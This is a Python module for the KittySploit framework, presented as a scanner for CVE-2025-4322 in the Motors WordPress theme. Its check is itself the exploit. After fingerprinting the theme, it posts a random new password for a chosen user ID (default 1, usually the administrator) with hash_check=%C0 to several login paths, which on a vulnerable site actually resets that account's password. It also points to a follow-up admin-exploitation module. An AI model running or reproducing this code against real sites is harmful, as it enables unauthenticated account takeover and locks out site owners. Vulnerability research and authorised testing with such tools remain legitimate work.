#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Motors theme <= 5.6.67 unauthenticated password change (CVE-2025-4322)."""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Motors CVE-2025-4322 password change detect",
        "description": (
            "Detects CVE-2025-4322: Motors theme accepts stm_new_password for arbitrary user_id "
            "with hash_check=%C0 without authentication."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-4322",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-4322"],
        "modules": ["auxiliary/admin/http/motors_cve_2025_4322_password_change"],
        "tags": ["web", "scanner", "wordpress", "motors", "theme", "cve-2025-4322"],
        "agent": {
            "approval_required": True,
            "chain": {"suggested_followups": ["auxiliary/admin/http/motors_cve_2025_4322_password_change"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    user_id = OptInteger(1, "Target user id", required=False)

    _PATHS = (
        "/login",
        "/loginregister",
        "/login-register",
        "/my-account",
        "/account",
        "/signin",
        "/register",
    )

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        style = self.http_request(
            method="GET",
            path=self._join("/wp-content/themes/motors/style.css"),
            allow_redirects=True,
        )
        if not style or style.status_code != 200:
            home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
            if not home or "/themes/motors" not in (home.text or ""):
                return False
        pwd = secrets.token_urlsafe(10)
        uid = int(self.user_id or 1)
        for login_path in self._PATHS:
            r = self.http_request(
                method="POST",
                path=self._join(login_path),
                params={"user_id": str(uid), "hash_check": "%C0"},
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data={"stm_new_password": pwd},
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            if "Enter new password" in body and "stm-validation-message" in body:
                self.set_info(
                    severity="critical",
                    reason=f"Motors CVE-2025-4322 — password change accepted for user_id={uid}",
                    path=login_path,
                    cve="CVE-2025-4322",
                )
                return True
        return False
